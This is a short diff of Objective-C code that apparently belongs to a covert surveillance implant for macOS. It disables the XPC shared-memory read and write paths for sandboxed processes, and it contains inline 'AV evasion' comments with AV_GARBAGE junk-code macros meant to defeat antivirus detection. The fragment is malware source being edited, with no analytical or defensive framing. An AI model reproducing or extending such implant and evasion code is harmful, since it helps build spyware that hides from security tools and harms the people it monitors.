   // if sandboxed read shmem by xpc api
-  if (amISandboxed)
-  {
-    readData = [self readMemoryByXPCFromComponent: aComponent 
-                                         forAgent: anAgentID 
-                                  withCommandType: aCommandType];  
-    
-    return readData;
-  }
+//  if (amISandboxed)
+//  {
+//    readData = [self readMemoryByXPCFromComponent: aComponent 
+//                                         forAgent: anAgentID 
+//                                  withCommandType: aCommandType];  
+//    
+//    return readData;
+//  }
   
   BOOL lookForAgent       = NO;
   BOOL foundAgent         = NO;
@@ -1121,13 +1121,13 @@ static BOOL amIPrivileged()
   NSMutableData *readData = nil;
   
   // if sandboxed read shmem by xpc api
-  if (amISandboxed)
-  {
-    readData = [self readMemoryByXPC: anOffset 
-                       fromComponent: aComponent];  
-    
-    return [readData autorelease];
-  }
+//  if (amISandboxed)
+//  {
+//    readData = [self readMemoryByXPC: anOffset 
+//                       fromComponent: aComponent];  
+//    
+//    return [readData autorelease];
+//  }
   
   // AV evasion: only on release build
   AV_GARBAGE_003
@@ -1190,9 +1190,9 @@ static BOOL amIPrivileged()
   // AV evasion: only on release build
   AV_GARBAGE_002
   
-  // Do it by xpc service
-  if (amISandboxed) 
-    return [self writeMemorybyXPC:aData offset:anOffset fromComponent:aComponent];
+//  // Do it by xpc service
+//  if (amISandboxed) 
+//    return [self writeMemorybyXPC:aData offset:anOffset fromComponent:aComponent];
   
   //
   // In case we receive 0 as offset it means that we're dealing within the logs
